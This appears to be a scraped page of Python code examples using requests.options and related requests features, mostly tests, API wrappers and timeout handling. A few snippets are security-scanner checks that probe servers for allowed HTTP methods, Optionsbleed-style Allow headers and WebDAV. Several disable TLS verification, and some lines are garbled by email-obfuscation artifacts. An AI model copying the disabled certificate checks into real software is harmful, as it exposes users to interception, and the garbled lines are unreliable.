def test_should_respond_to_any_options(self):
        server.on('OPTIONS').status(200)
        res = requests.options('http://localhost:8080/some/url', headers={'foo': 'bar'})
        self.assertEqual(res.status_code, 200) 
**************************************
def test_should_always_respond_to_matching_queries(self):
        server.always('OPTIONS').status(200)
        res = requests.options('http://localhost:8080/some/url', headers={'foo': 'bar'})
        self.assertEqual(res.status_code, 200)
        res = requests.options('http://localhost:8080/some/url', headers={'foo': 'bar'})
        self.assertEqual(res.status_code, 200) 
**************************************
def test_should_reset_always_rules(self):
        server.always('OPTIONS').status(200)
        server.reset()
        res = requests.options('http://localhost:8080/some/url', headers={'foo': 'bar'})
        self.assertEqual(res.status_code, 500) 
**************************************
def getIxNetHelp(ixnetUrl, sessionId, urlObj):
    try:
        response = requests.options(ixnetUrl+"sessions/"+str(sessionId)+"/ixnetwork" + urlObj)
    except Exception, e:
        raise Exception('Got an error code: ', e) 
**************************************
def options(self, headers=None, url_parameters={}):
        return requests.options(
            self.endpoint,
            params=url_parameters,
            headers=headers
        ) 
**************************************
def is_cross_origin_accessible(path, origin='http://example.org'):
    """
    Returns True if the path is accessible at the given origin
    (default: example.org).

    Raises AssertionError otherwise.
    """

    response = requests.options(path, headers={'Origin': origin})
    assert response.status_code == 200
    assert is_allowed_origin(origin, response)

    return True 
**************************************
def is_cross_origin_accessible(path, origin='http://example.org'):
    """
    Returns True if the path is accessible at the given origin
    (default: example.org).

    Raises AssertionError otherwise.
    """

    response = requests.options(path, headers={'Origin': origin})
    assert response.status_code == 200
    assert is_allowed_origin(origin, response)

    return True 
**************************************
def options(*args, **kwargs):
    override_kwargs(kwargs)
    return requests.options(*args, **kwargs) 
**************************************
def options(url, **kwargs) -> AsyncResponse:
    return AsyncResponse(
        await run_sync_func(requests.options, url=url, **kwargs)) 
**************************************
def __init__(self, host):
        self.host = host
        self.session = requests.Session()
        try:
            # Run a request to trigger request's imports.
            # We don't care if it works
            requests.options(self.host)
        except:
            pass 
**************************************
def __check_server_url(self, url):
        try:
            r = requests.options(url, verify=self.ssl_verify)
        except requests.exceptions.ConnectionError:
            raise AssertionError('No connection possible for ' + url)
        if not r.status_code == 200:
            raise AssertionError('Got a {0} for {1}'.format(r.status_code, url))
        methods = r.headers['allow'].replace(' ', '').split(',')
        assert 'OPTIONS' in methods
        assert 'POST' in methods
        return True 
**************************************
def heartbeat_active(self):
        """Is this server's /heartbeat running ok (returning code < 400)"""
        try:
            return requests.options('http://{}/heartbeat'.format(self.server.public_ip)).ok
        except requests.exceptions.ConnectionError:
            return False 
**************************************
def __init__(self, call):
        # define the host alternatives
        self.host="https://play.dhis2.org/dev_qa1"
        self.r = {}
        # the call that is passed in may or may not have query parameters
        self.api_call=re.sub(r'/api/[0-9]{2}/',r'/api/',call[call.find("/api/"):])
        self.parts = self.api_call.rstrip('\n').split('?')
        self.endpoint=self.parts[0].rstrip('\n')
        ep = ""
        epDelim = ""
        for epp in self.endpoint.split('/')[1:]:
            if len(epp) == 11:
                print("uid?:",epp)
                epp = "@[email protected]"
            ep += epDelim + epp
            epDelim = "__"

        self.endpoint_ = ep
        self.response = ""
        self.content = ""
        self.method = ""
        self.payload = ""

        # split any query parameters up into a list of key,value pairs
        self.query_params = []
        if len(self.parts) > 1:
            self.append_queries(self.parts[1])

        self.functions = {
            "get": requests.get ,
            "post": requests.post ,
            "patch": requests.patch ,
            "options": requests.options ,
            "put": requests.put ,
            "delete": requests.delete
        } 
**************************************
def __init__(self, call):
        # define the host alternatives
        self.host="https://play.dhis2.org/dev_qa1"
        self.r = {}
        # the call that is passed in may or may not have query parameters
        self.api_call=re.sub(r'/api/[0-9]{2}/',r'/api/',call[call.find("/api/"):])
        self.parts = self.api_call.rstrip('\n').split('?')
        self.endpoint=self.parts[0].rstrip('\n')
        ep = ""
        epDelim = ""
        for epp in self.endpoint.split('/')[1:]:
            if len(epp) == 11:
                #print("uid?:",epp)
                epp = "@[email protected]"
            ep += epDelim + epp
            epDelim = "__"

        self.endpoint_ = ep
        self.response = ""
        self.content = ""
        self.method = ""
        self.payload = ""

        # split any query parameters up into a list of key,value pairs
        self.query_params = []
        if len(self.parts) > 1:
            self.append_queries(self.parts[1])

        self.functions = {
            "get": requests.get ,
            "post": requests.post ,
            "patch": requests.patch ,
            "options": requests.options ,
            "put": requests.put ,
            "delete": requests.delete
        } 
**************************************
def test_nonparam(self):
        resp = requests.options('{0}/demo'.format(URL))
        methods = resp.headers['access-control-allow-methods'].replace(' ', '')
        self.assertEqual(resp.status_code, 204)
        allow = resp.headers['allow'].replace(' ', '')
        self.assertSetEqual(
                set(methods.split(',')),
                set(['OPTIONS', 'GET', 'POST'])
                )
        self.assertSetEqual(
                set(allow.split(',')),
                set(['OPTIONS', 'GET', 'POST'])
                ) 
**************************************
def test_param(self):
        resp = requests.options('{0}/demo/1'.format(URL))
        methods = resp.headers['access-control-allow-methods'].replace(' ', '')
        allow = resp.headers['allow'].replace(' ', '')
        self.assertEqual(resp.status_code, 204)
        self.assertSetEqual(
                set(methods.split(',')),
                set(['OPTIONS', 'GET', 'DELETE', 'PUT'])
                )
        self.assertSetEqual(
                set(allow.split(',')),
                set(['OPTIONS', 'GET', 'DELETE', 'PUT'])
                ) 
**************************************
def requests_options(url, **kwargs):
    """Requests-mock requests.options wrapper."""
    kwargs.setdefault('allow_redirects', True)
    return requests_request('options', url, **kwargs) 
**************************************
def options(*args, **kwargs):
        """requests.session.Session.options wrapper."""
        return local_session.session.options(*args, **kwargs) 
**************************************
def __enter__(self):
        """Setup the context to use the Stack-In-A-Box variants."""
        logger.debug('Using session with id {0}'
                     .format(id(local_sessions.session)))
        requests.request = requests_request
        requests.get = requests_get
        requests.options = requests_options
        requests.head = requests_head
        requests.post = requests_post
        requests.put = requests_put
        requests.patch = requests_patch
        requests.delete = requests_delete
        requests.session = local_sessions.session
        requests.Sesssion = requests_session
        requests.sessions.Sesssion = requests_session 
**************************************
def check_option_methods(self, hostname):
        try:
            r = requests.options('http://' + hostname, timeout=5)
            print("[+] {}".format(r.headers['allow']))
        except KeyError:
            print("{}[!]{} Not allow methods found!".format(Colors.RED, Colors.END))
            pass
        except Exception as err:
            print("[!] Error to connect with {} for obtain option methods".format(hostname))
            print("{}[!]{} {}".format(Colors.RED, Colors.END, err))
            pass 
**************************************
def exploit(request, response, method, key, is_array=False):

    if config.dbconn().fetch_rows('result', condition="exploit='%s' and result != 'continue' and `host`='%s'" % (os.path.basename(__file__)[:-3], request['host']), order="id asc", limit="1", fetchone=True): return
    allow = requests.options(request['uri']).headers.get('Allow', '')
    if allow.find('PUT') != -1 or allow.find('PATCH') != -1:
        return {'result': 'vul', 'info': "Server support put/patch method", 'hash': None, 'level': "middle"}
    else:
        return {'result': 'safe', 'info': "Server does not support put/patch method", 'hash': None, 'level': "middle"} 
**************************************
def api_request(url,method,headers,body=None):
    try:    
        if method.upper() == "GET":
            auth_request = requests.get(url,headers=headers, allow_redirects=False,verify=False)
        elif method.upper() == "POST":
            auth_request = requests.post(url,headers=headers,json=body, allow_redirects=False,verify=False)
        elif method.upper() == "PUT":
            auth_request = requests.put(url,headers=headers,data=body, allow_redirects=False,verify=False)
        elif method.upper() == "OPTIONS":
            auth_request = requests.options(url,headers=headers, verify=False)
        return auth_request

    except Exception as e:
        logs.logging.error("Exception from sendrequest %s",e) 
**************************************
def check_custom_header(url, header_name):
	# Check if custom header is allowed to send. 
	request_header = {'Access-Control-Request-Headers' : header_name}
	req_custom_header = requests.options(url, header_name,verify=False)
	try:
		if req_custom_header.headers['Access-Control-Allow-Headers'] == header_name:
			return True
		else:
			return False
	except:
		return False 
**************************************
def test_options(self, circuits_app, new_incident):
        """Verify the web service is responding to the OPTIONS method"""
        #WebTest({}).register(circuits_app.app.component_loader)
        response = requests.options(SERVICE_URL)
        assert response.status_code == 200 
**************************************
def run(url):
    response = requests.options(url + '/')
    if 'propfind' in response.headers.get('allow', '').lower() or response.status_code == 401:
        click.echo(click.style('WebDAV is enabled', fg='green'))
    else:
        click.echo(click.style('WebDAV is disabled', fg='red')) 
**************************************
def does_it_bleed(url, method, verify=True):
    header = {'user-agent': 'Mozilla'}
    r = ''
    print('[+] checking {0} method'.format(method.upper()))
    try:
        if method == 'option':
            r = requests.options(url, headers=header, verify=verify, timeout=5)
        elif method == 'custom':
            r = requests.request('PULL', url, headers=header, verify=verify, timeout=5)
        else:
            print('[!] invalid method!')
            return False
    except requests.exceptions.ConnectionError:
        print('[!] connection error!')
        return False
    except requests.exceptions.ReadTimeout:
        print('[!] connection timed out!')
        return False
    # TODO: SSL verify exception
    low_headers = [header.lower() for header in r.headers.keys()]
    if args.verbose:
        print('[*] VERBOSE: \n\t-raw {0} headers: \n\t{1} \n\t-low {0} headers: \n\t{2}'.format(
            method.upper(), ' '.join(r.headers.keys()), ' '.join(low_headers)))
    if 'allow' in low_headers:
        print('[+] allow headers detected in {0} response'.format(method.upper()))
        return True 
**************************************
def bleed(url, method='option', verify=True):
    header = {'user-agent': 'Mozilla'}
    try:
        if method == 'custom':
            r = requests.request('PULL', url, headers=header, verify=verify, timeout=2)
        else:
            r = requests.options(url, headers=header, verify=verify, timeout=2)
    except Exception as e:
        errors.append(str(e.message))
        return
    results.append(r.headers.get('Allow')) 
**************************************
def __accept_post_options(self, inbox, **kwargs):
        r = requests.options(inbox, **kwargs)
        if r.status_code == requests.codes.ok and 'accept-post' in r.headers:
            if self.JSON_LD in r.headers['accept-post']:
                return self.JSON_LD

            for content_type in r.headers['accept-post'].split(','):
                return self.content_type_to_mime_type(content_type) 
**************************************
def test_OPTIONS_CORS_headers_valid_origin(self):
        # before sending a POST, the browser will send an OPTION request as a preflight to see the CORS headers.
        # the backend will only return the required CORS headers, if the Origin is set to a allowed domain.
        post_payload = create_post_payload()
        valid_origin = 'http://testdomain.com'
        preflight_response = requests.options(url=COMMENT_SIDECAR_URL, json=post_payload, headers={'Origin': valid_origin})
        assert_cors_headers_exists(preflight_response, valid_origin)
        assert_that(preflight_response.text).is_empty()
        assert_that(get_comments().json())\
            .described_as("No comment should have been created after an OPTIONS request")\
            .is_empty() 
**************************************
def test_OPTIONS_CORS_headers_invalid_origin(self):
        post_payload = create_post_payload()
        valid_origin = 'http://invalid.com'
        preflight_response = requests.options(url=COMMENT_SIDECAR_URL, json=post_payload, headers={'Origin': valid_origin})
        assert_cors_headers_doesnt_exists(preflight_response)
        assert_that(preflight_response.text).is_empty()
        assert_that(get_comments().json()) \
            .described_as("No comment should have been created after an OPTIONS request") \
            .is_empty() 
**************************************
def __init__(self,Medusa):
        self.info = {}
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['algroup'] = "options"  # 插件名称
        self.info['name'] ='options方法开启漏洞' #漏洞名称
        self.info['affects'] = "http"  # 漏洞组件
        self.info['desc_content'] = ""  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "只允许get以及post方法"  # 修复建议
        self.info['details'] = Medusa  # 结果 
**************************************
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+ ':' + str(port)
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.options(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.options(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if r"OPTIONS" in resp.headers['Allow']:
            Medusa = "{}存在options方法开启漏洞 \r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            _t = VulnerabilityInfo(Medusa)
            web = ClassCongregation.VulnerabilityDetails(_t.info)
            web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            return (str(_t.info))
    except:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l=ClassCongregation.ErrorLog().Write(url,_)#调用写入类 
**************************************
def test_get_request_method_returns_options(self):
        self.assertEqual(self.request.get_requests_method("OPTIONS"), requests.options)
        self.assertEqual(self.request.get_requests_method("options"), requests.options) 
**************************************
def is_deployment_available(params):
    url = get_deployment_url(params)
    response = requests.options(url)
    return response.status_code == 200 
**************************************
def api_request(self, endpoint, method='get', payload=None):
        method = method.lower()

        if payload is None:
            payload = ''

        if self.oauth2:
            header = {'Authorization': 'Bearer {0}'.format(self.api_token)}
        else:
            header = {'X-Figma-Token': '{0}'.format(self.api_token)}

        header['Content-Type'] = 'application/json'

        try:
            if method == 'head':
                response = requests.head('{0}{1}'.format(self.api_uri, endpoint), headers=header)
            elif method == 'delete':
                response = requests.delete('{0}{1}'.format(self.api_uri, endpoint), headers=header)
            elif method == 'get':
                response = requests.get('{0}{1}'.format(self.api_uri, endpoint), headers=header, data=payload)
            elif method == 'options':
                response = requests.options('{0}{1}'.format(self.api_uri, endpoint), headers=header)
            elif method == 'post':
                response = requests.post('{0}{1}'.format(self.api_uri, endpoint), headers=header, data=payload)
            elif method == 'put':
                response = requests.put('{0}{1}'.format(self.api_uri, endpoint), headers=header, data=payload)
            else:
                response = None
            if response.status_code == 200:
                return json.loads(response.text)
            else:
                return None
        except (Exception, requests.HTTPError, requests.exceptions.SSLError) as e:
            print('Error occurred attpempting to make an api request. {0}'.format(e))
            return None

    # -------------------------------------------------------------------------
    # OAUTH2
    # ------------------------------------------------------------------------- 
**************************************
def test_cors(api_url: str):
    headers = {
        "Origin": "http://example.com/",
        "Access-Control-Request-Method": "GET",
        "Access-Control-Request-Headers": "X-Requested-With",
    }

    response = requests.options(api_url, headers=headers)
    assert response.headers["Access-Control-Allow-Origin"] == "*"
    assert response.headers["Access-Control-Allow-Headers"] == "Origin, Content-Type, Accept" 
**************************************
def send_request_generic(url, method, headers, body=None):
    try:    
        if method.upper() == "GET":
            response = requests.get(url,headers=headers, allow_redirects=False,verify=False)
        elif method.upper() == "POST":
            response = requests.post(url,headers=headers,json=body, allow_redirects=False,verify=False)
        elif method.upper() == "PUT":
            response = requests.put(url,headers=headers,data=body, allow_redirects=False,verify=False)
        elif method.upper() == "OPTIONS":
            response = requests.options(url,headers=headers, verify=False)
        return response

    except Exception as e:
       print("Exception from request_generic %s",e) 
**************************************
def validate_input():
    if(options.host is None or options.password is None):
        print("Invalid input, use -h switch for help")
        sys.exit(2) 
**************************************
def call_session_options():
    hdrs = {'Content-Type': 'application/json','Accept': 'application/json'}
    r = requests.options(options.host + '/api/endeavour/session', timeout=None, verify=False)
    if(r.status_code is not 200):
        return False
    else:
        return True 
**************************************
def change_password():
    logger.info("Setting admin password")
    hdrs = {'Content-Type': 'application/json','Accept': 'application/json'}
    payload = {'changePassword': 'true'}
    body = {"newPassword": options.password}
    r = requests.post(options.host + '/api/endeavour/session', json=body,
                      auth=requests.auth.HTTPBasicAuth('admin','password'),
                      verify=False, headers=hdrs, params=payload)
    if 'sessionid' not in r.json():
        logger.info("Deployment not finished, trying again.")
        time.sleep(5)
        change_password()
    else:
        return r.json()['sessionid'] 
**************************************
def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        vulnurl = self.url
        try:
            req = requests.options(vulnurl, headers=headers, timeout=10, verify=False)

            if r"OPTIONS" in req.headers['Allow']:
                return "[+]存在options方法开启...(敏感信息)"+"\tpayload: "+vulnurl+"\tAllow:"+req.headers['Allow']
            else:
                return "[-]NO vuln!"
        except:
            return "[-] ======>连接超时" 
**************************************
def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        vulnurl = self.url
        try:
            req = requests.options(vulnurl, headers=headers, timeout=10, verify=False)

            if r"OPTIONS" in req.headers['Allow']:
                return "[+]存在options方法开启...(敏感信息)"+"\tpayload: "+vulnurl+"\tAllow:"+req.headers['Allow']
            else:
                return "[-]NO vuln!"
        except:
            return "[-] ======>连接超时" 
**************************************
def options(self, uri, params=None, headers=None):

        if headers is None:
            headers = dict()
            headers.update(self._headers)

        return requests.options(self._url + uri, params=params, headers=headers) 

Python requests.models() Examples

**************************************
def api_call(
        self, path: str, method: str = "get", data: Dict[str, Any] = None
    ) -> Response:
        """Handle CloudEndure API calls based on the defined parameters.

        Args:
            path (str): The path to be used to perform the call.

        Keyword Args:
            method (str): The API method call to be performed. i.e.: get,
            data (dict): The data dictionary to be used to perform the request.

        Returns:
            requests.models.Response: The CloudEndure API response.

        """
        method: str = method.lower()  # Ensure the provided method is lowercase.

        if data is None:
            data: Dict[str, Any] = {}

        if method not in METHOD_TYPES:
            print("Please specify a valid method type! Must be one of: ", METHOD_TYPES)
            return Response()

        if method not in ["get", "delete"] and not data:
            print(
                "Paramater mismatch! If calling anything other than get or delete provide data!"
            )
            return Response()

        # Attempt to call the CloudEndure API.
        try:
            ce_call = getattr(self.session, method)
            _path = self.get_endpoint(path)
            return ce_call(_path, data=data)
        except Exception as e:
            print(f"Exception encountered in CloudEndure API call: ({e})")
        return Response() 

Python requests.structures() Examples

**************************************
def _merge_headers(self, call_specific_headers):
        """
        Merge headers from different sources together.  Headers passed to the
        post/get methods have highest priority, then headers associated with
        the connection object itself have next priority.

        :param call_specific_headers: A header dict from the get/post call, or
            None (the default for those methods).
        :return: A key-case-insensitive MutableMapping object which contains
            the merged headers.  (This doesn't actually return a dict.)
        """

        # A case-insensitive mapping is necessary here so that there is
        # predictable behavior.  If a plain dict were used, you'd get keys in
        # the merged dict which differ only in case.  The requests library
        # would merge them internally, and it would be unpredictable which key
        # is chosen for the final set of headers.  Another possible approach
        # would be to upper/lower-case everything, but this seemed easier.  On
        # the other hand, I don't know if CaseInsensitiveDict is public API...?

        # First establish defaults
        merged_headers = requests.structures.CaseInsensitiveDict({
            "User-Agent": self.user_agent
        })

        # Then overlay with specifics from post/get methods
        if call_specific_headers:
            merged_headers.update(call_specific_headers)

        # Special "User-Agent" header check, to ensure one is always sent.
        # The call-specific overlay could have null'd out that header.
        if not merged_headers.get("User-Agent"):
            merged_headers["User-Agent"] = self.user_agent

        return merged_headers 

Python requests.ConnectTimeout() Examples

**************************************
def get_mirror_list(self):
        html_page = None

        for mirror_list_page in self.MIRROR_LIST_PAGES:
            try:
                # logging.info("Fetching mirrors from " + mirror_list_page)
                html_page = requests.get(mirror_list_page)
            except requests.ConnectTimeout:
                # logging.info("Timeout")
                continue
            else:
                break

        if html_page is None:
            raise LookupError

        soup = BeautifulSoup(html_page.text, features="html.parser")
        rows = soup.find(id="proxyList").find_all("tr")[1:]

        return [row.find("a")["href"] for row in rows] 
**************************************
def test_okta_connection_timeout(
            self,
            mock_print_tty,
            mock_makedirs,
            mock_open,
            mock_chmod
    ):
        responses.add(
            responses.POST,
            'https://organization.okta.com/api/v1/authn',
            body=ConnectTimeout()
        )

        with self.assertRaises(SystemExit):
            Okta(
                user_name="user_name",
                user_pass="user_pass",
                organization="organization.okta.com"
            )

        print_tty_calls = [
            call("Error: Timed Out")
        ]

        mock_print_tty.assert_has_calls(print_tty_calls) 
**************************************
def is_agent_listening(self, host, port):
        """
        Check if the Instana Agent is listening on <host> and <port>.
        """
        try:
            rv = False
            url = "http://%s:%s/" % (host, port)
            response = self.client.get(url, timeout=0.8)

            server_header = response.headers["Server"]
            if server_header == AGENT_HEADER:
                logger.debug("Instana host agent found on %s:%d", host, port)
                rv = True
            else:
                logger.debug("...something is listening on %s:%d but it's not the Instana Host Agent: %s",
                             host, port, server_header)
        except (requests.ConnectTimeout, requests.ConnectionError):
            logger.debug("Instana Host Agent not found on %s:%d", host, port)
            rv = False
        finally:
            return rv 
**************************************
def announce(self, discovery):
        """
        With the passed in Discovery class, attempt to announce to the host agent.
        """
        try:
            url = self.__discovery_url()
            # logger.debug("making announce request to %s", url)
            response = None
            response = self.client.put(url,
                                       data=to_json(discovery),
                                       headers={"Content-Type": "application/json"},
                                       timeout=0.8)

            if response.status_code is 200:
                self.last_seen = datetime.now()
        except (requests.ConnectTimeout, requests.ConnectionError):
            logger.debug("announce", exc_info=True)
        finally:
            return response 
**************************************
def report_data(self, entity_data):
        """
        Used to report entity data (metrics & snapshot) to the host agent.
        """
        try:
            response = None
            response = self.client.post(self.__data_url(),
                                        data=to_json(entity_data),
                                        headers={"Content-Type": "application/json"},
                                        timeout=0.8)

            # logger.warn("report_data: response.status_code is %s" % response.status_code)

            if response.status_code is 200:
                self.last_seen = datetime.now()
        except (requests.ConnectTimeout, requests.ConnectionError):
            logger.debug("report_data: Instana host agent connection error")
        finally:
            return response 
**************************************
def report_traces(self, spans):
        """
        Used to report entity data (metrics & snapshot) to the host agent.
        """
        try:
            # Concurrency double check:  Don't report if we don't have
            # any spans
            if len(spans) == 0:
                return 0

            response = None
            response = self.client.post(self.__traces_url(),
                                        data=to_json(spans),
                                        headers={"Content-Type": "application/json"},
                                        timeout=0.8)

            # logger.warn("report_traces: response.status_code is %s" % response.status_code)

            if response.status_code is 200:
                self.last_seen = datetime.now()
        except (requests.ConnectTimeout, requests.ConnectionError):
            logger.debug("report_traces: Instana host agent connection error")
        finally:
            return response 
**************************************
def test_put_sms_error_network(self, mock_post):
        service = sms_plusserver.SMSService(
            username='user', password='pass', project='TESTPROJECT'
        )

        with self.assertRaises(sms_plusserver.CommunicationError) as raised:
            service.put_sms('+4911122233344', 'Hello!')

        mock_post.assert_called_once_with(
            sms_plusserver.SMSService.SMS_PUT_URL,
            {
                'dest': '+4911122233344',
                'data': 'Hello!',
                'debug': '0',
                'project': 'TESTPROJECT',
                'registered_delivery': '1',
            },
            auth=('user', 'pass'),
            timeout=None
        )
        self.assertIsInstance(
            raised.exception.original_exception, requests.ConnectTimeout
        ) 
**************************************
def test_check_sms_state_error_network(self, mock_post):
        service = sms_plusserver.SMSService(
            username='user', password='pass', project='TESTPROJECT'
        )

        with self.assertRaises(sms_plusserver.CommunicationError) as raised:
            service.check_sms_state('d41d8cd98f00b204e9800998ecf8427e')

        mock_post.assert_called_once_with(
            sms_plusserver.SMSService.SMS_STATE_URL,
            {
                'handle': 'd41d8cd98f00b204e9800998ecf8427e',
            },
            auth=('user', 'pass'),
            timeout=None
        )
        self.assertIsInstance(
            raised.exception.original_exception, requests.ConnectTimeout
        ) 
**************************************
def test_timeouts(self):
        # This doesn't cover the read timeout because that is harder to mock without adversely affecting the
        # environment we're running in, but if we observe that the `requests` library correctly applies the
        # connection timeout we can safely assume that would also apply the read timeout.
        client = hca.dss.DSSClient()
        client.timeout_policy = Timeout(connect=.123, read=.234)
        # Prevent unnecessary retries on socket.connect() that don't contribute to code coverage
        client.retry_policy = RetryPolicy(connect=0)
        with mock.patch('socket.socket.settimeout') as mock_settimeout:
            with mock.patch('socket.socket.connect') as mock_connect:
                mock_connect.side_effect = socket.timeout
                self.assertRaises(ConnectTimeout, client.get_bundle, uuid=str(uuid.uuid4()), replica='gcp')
            settimeout_calls, connect_calls = mock_settimeout.mock_calls, mock_connect.mock_calls
            # If a domain name resolves to more than one IP (multiple A records with the same name), urllib3 will
            # try each one in turn. That's why we may observe multiple calls to settimeout() and connect(). But they
            # should come in pairs. We don't care what connect() was called with, only settimout().
            self.assertEqual(len(settimeout_calls), len(connect_calls))
            self.assertEqual(settimeout_calls, [mock.call(.123)] * len(settimeout_calls)) 
**************************************
def do(self, api_name=None, pk=None, method='get', use_auth=True,
           data=None, params=None, content_type='application/json', **kwargs):

        if api_name in API_URL_MAPPING:
            path = API_URL_MAPPING.get(api_name)
            if pk and '%s' in path:
                path = path % pk
        else:
            path = api_name

        request_headers = kwargs.get('headers', {})
        default_headers = self.default_headers or {}
        headers = {k: v for k, v in default_headers.items()}
        headers.update(request_headers)
        kwargs['headers'] = headers
        url = self.endpoint.rstrip('/') + path
        req = HttpRequest(url, method=method, data=data,
                          params=params, content_type=content_type,
                          **kwargs)
        if use_auth:
            if not self.auth:
                msg = 'Authentication required, but not provide'
                logger.error(msg)
                raise RequestError(msg)
            else:
                self.auth.sign_request(req)

        try:
            resp = req.do()
        except (requests.ConnectionError, requests.ConnectTimeout) as e:
            msg = "Connect endpoint {} error: {}".format(self.endpoint, e)
            logger.error(msg)
            raise RequestError(msg)

        return self.clean_result(resp) 
**************************************
def predict(self, text):
        for validator in self.predict_validators:
            validator(text)

        try:
            data = json.dumps({'text': text})
            response = requests.post(self.endpoint, data=data, timeout=self.timeout)
        except (ConnectTimeout, ):
            raise GatewayTimeout()
        else:
            return response 
**************************************
def _fetch_inventory(self, inventory_url: str, config: SphinxConfiguration) -> Optional[dict]:
        """Get and return inventory from `inventory_url`. If fetching fails, return None."""
        fetch_func = functools.partial(intersphinx.fetch_inventory, config, '', inventory_url)
        for retry in range(1, FAILED_REQUEST_RETRY_AMOUNT+1):
            try:
                package = await self.bot.loop.run_in_executor(None, fetch_func)
            except ConnectTimeout:
                log.error(
                    f"Fetching of inventory {inventory_url} timed out,"
                    f" trying again. ({retry}/{FAILED_REQUEST_RETRY_AMOUNT})"
                )
            except ProtocolError:
                log.error(
                    f"Connection lost while fetching inventory {inventory_url},"
                    f" trying again. ({retry}/{FAILED_REQUEST_RETRY_AMOUNT})"
                )
            except HTTPError as e:
                log.error(f"Fetching of inventory {inventory_url} failed with status code {e.response.status_code}.")
                return None
            except ConnectionError:
                log.error(f"Couldn't establish connection to inventory {inventory_url}.")
                return None
            else:
                return package
        log.error(f"Fetching of inventory {inventory_url} failed.")
        return None 
**************************************
def test_transplant_unhealthy(app, request_mocker):
    request_mocker.get(trans_url(""), exc=requests.ConnectTimeout)
    assert transplant_subsystem.healthy() is not True 
**************************************
def __request_data(self):
        if self.__is_cache_valid():
            return True

        # requesting data
        try:
            # setting 5 sec timeouts for connect and read
            r = requests.get(self.data_url, verify=False, allow_redirects=True, timeout=(5, 5))
        except requests.ConnectionError as e:
            print("Unable to connect to ", self.data_url, " error is ", e, file=sys.stderr)
            return False
        except requests.ConnectTimeout as e:
            print("Timed out connection to ", self.data_url, " error is ", e, file=sys.stderr)
            return False
        except requests.ReadTimeout as e:
            print("Timed out while reading data from ", self.data_url, " error is ", e, file=sys.stderr)
            return False

        if r.status_code == 200:
            # got HTTP/200 for request - storing it in cache
            try:
                open(self.temp_file_name, mode="w").write(json.dumps(r.json()))
            except IOError as e:
                print("IO error while trying to store cache into file ", self.temp_file_name, " error is ",
                      e, file=sys.stderr)
                return False
            return True
        else:
            return False 
**************************************
def isActiveLink(link):
        try:
            request = requests.get(link)
            return request.status_code
        except (requests.ConnectionError, requests.ConnectTimeout):
            return False 
**************************************
def test_timeout(self):
        """
        Connection timeouts to the API are handled gracefully.

        """
        request_mock = self._get_exception_mock(requests.ConnectTimeout())
        with mock.patch("requests.get", request_mock):
            result = api.pwned_password(self.sample_password)
            self.assertEqual(None, result) 
**************************************
def call(self, endpoint=None, headers=None, json_payload=None):
        print_tty(
            "Info: Calling {}".format(endpoint),
            silent=self.silent
        )

        try:
            if json_payload is not None:
                return self.session.post(
                    endpoint,
                    json=json_payload,
                    headers=headers,
                    timeout=10
                )
            else:
                return self.session.get(
                    endpoint,
                    headers=headers,
                    timeout=10
                )

        except ConnectTimeout:
            print_tty("Error: Timed Out")
            sys.exit(1)

        except ConnectionError:
            print_tty("Error: Connection Error")
            sys.exit(1) 
**************************************
def create_conn_obj(self):
        user_agent = get_desktop_uagent()
        if self.url:
            url = self.url
        else:
            url = '{}://{}:{}/'.format(self.transport, self.hostname, self.port)

        try:
            r = requests.get(url, timeout=10, headers={'User-Agent': user_agent})
            self.server_headers = r.headers
        except ConnectTimeout, ReadTimeout:
            return False 
**************************************
def requests_provider(
            self, url, post=False, data=None, perfom_redirect=True, update_cookies=True, update_referer=True, **kwargs
    ):
        try:
            response = getattr(requests, "post" if post else "get")(
                url,
                headers=self.return_headers(url),
                data=data,
                allow_redirects=False,
                **kwargs
            )

            self.display.last_request = (
                url, data, kwargs, response.status_code, "\n".join(
                    ["\t{}: {}".format(*h) for h in response.headers.items()]
                ), response.text
            )

        except (requests.ConnectionError, requests.ConnectTimeout, requests.RequestException) as request_exception:
            self.display.error(str(request_exception))
            return 0

        if update_cookies:
            self.update_cookies(response.cookies)

        if update_referer:
            # TODO Update Referer HTTP Header
            # TODO How about Origin? 
            self.HEADERS["referer"] = response.request.url

        if response.is_redirect and perfom_redirect:
            return self.requests_provider(response.next.url, post, None, perfom_redirect, update_cookies, update_referer)
            # TODO How about **kwargs?

        return response 
**************************************
def _download(self, request, spider):
        def _retry():
            if self.retry_on_download_timeout:
                self.logger.debug('Read timed out, retry request {}'.format(request))
                self.crawl(request, spider)

        try:
            self._process_request(request, spider)

            if request is None:
                return

            method = request.method.upper()

            resp = None
            kw_params = {
                'timeout': self.download_timeout,
                'cookies': request.cookies,
                'headers': request.headers,
                'proxies': {
                    'http': request.proxy,
                    'https': request.proxy
                }
            }

            self.logger.debug('[{}]<{} {}>'.format(spider.name, method, request.url))

            if method == 'GET':
                resp = requests.get(request.url, **kw_params)
            elif method == 'POST':
                resp = requests.post(request.url, request.data, **kw_params)

            self._responses_queue.put((Response(resp.url, resp.status_code, resp.content, request,
                                                resp.cookies), spider))
        except (requests.ReadTimeout, requests.ConnectTimeout, requests.ConnectionError):
            _retry()
        except Exception as err:
            self.logger.error(err, exc_info=True) 
**************************************
